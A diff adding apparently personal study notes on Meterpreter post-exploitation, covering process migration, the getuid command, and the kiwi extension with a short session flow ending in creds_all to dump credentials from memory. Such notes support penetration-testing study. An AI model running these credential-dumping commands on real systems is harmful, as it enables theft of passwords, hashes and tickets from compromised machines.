@@ -90,3 +90,24 @@ How does it work technically?
 -Your Meterpreter code injects itself into the memory space of the new target process.
 - Then it starts running from there.
 - This lets your session survive if the original exploited process exits.
+
+`getuid`\
+Shows which user account your Meterpreter session is currently running under.
+Example output
+```bash
+Server username: NT AUTHORITY\SYSTEM
+```
+
+`kiwi`\
+- A **post-exploitation tool** built into Metersploit thats like **Mimikaz**
+- It lets me **steal passwords, hashes, tickets** and more **directly from memory** all from within my Meterpreter session.\
+Example Flow:
+```bash
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+
+meterpreter > load kiwi
+[*] Successfully loaded extension: kiwi
+
+meterpreter > creds_all
+```
